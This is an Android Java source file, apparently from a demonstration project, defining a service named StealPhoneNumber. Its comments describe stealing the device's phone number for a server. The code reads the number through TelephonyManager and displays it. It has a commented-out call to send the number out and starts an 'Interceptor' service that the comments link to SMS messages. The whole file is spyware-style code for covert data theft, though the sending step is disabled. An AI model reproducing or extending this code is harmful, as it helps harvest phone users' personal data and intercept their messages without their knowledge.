package com.example.aahewins.helloworld;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.widget.Toast;
/**
 * Steals the phone number and prepares to send it to the server
 * @author Anthony Hewins
 * @version 1.0
 * @since 1.0
 */
public class StealPhoneNumber extends IntentService {
    public String phoneNumber = null; //Holds the phone number so it can be sent to the server
    /**
     * Default constructor
     */
    public StealPhoneNumber() {
        super("StealPhoneNumber");
    }
    /**
     * Creates the StealPhoneNumber IntentService, stealing the phone number and sending it.
     * Also starts the SMS BroadcastReceiver to wait until a message has been sent.
     */
    @Override
    public void onCreate() {
        super.onCreate();
        getPhoneNumber();
        Toast.makeText(this, "Extracted phone number: " + this.phoneNumber, Toast.LENGTH_SHORT).show();
//        new SendToServer(this.phoneNumber);
        startService(new Intent(this, Interceptor.class));
    }
    /**
     * Gets the phone number and assigns it to the field phoneNumber
     * for the calling object using TelephonyManager
     */
    public void getPhoneNumber() {
        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        this.phoneNumber = manager.getLine1Number();
    }
    /**
     * Not needed for this project, but overriden to prevent compiler errors.
     * @param intent N/a
     */
    @Override
    protected void onHandleIntent(Intent intent) {}
}

